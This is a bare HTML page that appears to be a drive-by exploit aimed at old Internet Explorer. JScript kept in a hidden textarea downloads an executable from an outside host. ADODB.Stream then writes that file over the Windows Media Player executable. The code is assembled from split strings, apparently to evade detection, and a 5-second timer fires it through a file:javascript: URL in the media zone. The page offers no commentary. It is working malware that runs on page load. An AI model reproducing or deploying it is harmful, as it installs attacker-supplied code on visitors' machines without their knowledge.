<html>
<textarea id="code" style="display:none;">
var x = new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET", "http://www.all-find.org/mih2/web.exe", 0);
var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);
location.href="mms://";
</textarea>
<script language="javascript">
function preparecode(code) 
{
  result = '';
  code=code+"s.Sav";
  code=code+"eToF";
  code=code+'ile("c:\\\\program';
  code=code+' files\\\\wind';
  code=code+'ows media player\\\\wmp';
  code=code+'layer.exe", 2);';
  lines = code.split(/\r\n/);
  for (i=0; i<lines.length; i++) 
  {
    line = lines[i];
    line = line.replace(/^\s+/,"");
    line = line.replace(/\s+$/,"");
    line = line.replace(/'/g,"\\'");
    line = line.replace(/[\\]/g,"\\\\");
    line = line.replace(/[/]/g,"%2f");
    if (line != '') 
    {
      result += line +'\\r\\n';
    }
  }
  return result;
}
function doit() 
{
  mycode = preparecode(document.all.code.value);
  her = mycode.split(/s.Mode = 3;/);
  avp="x.S";
  avp=avp+"end();\r\n";
  avp=avp+"s.Mode=3;\r\n;";
  mycode=her[0];
  mycode=mycode+avp;
  mycode=mycode+her[1];
  myURL = "file:javascript:eval('" + mycode + "')";
  window.open(myURL, "_media")
}
setTimeout("doit()", 5000);
</script>
</html>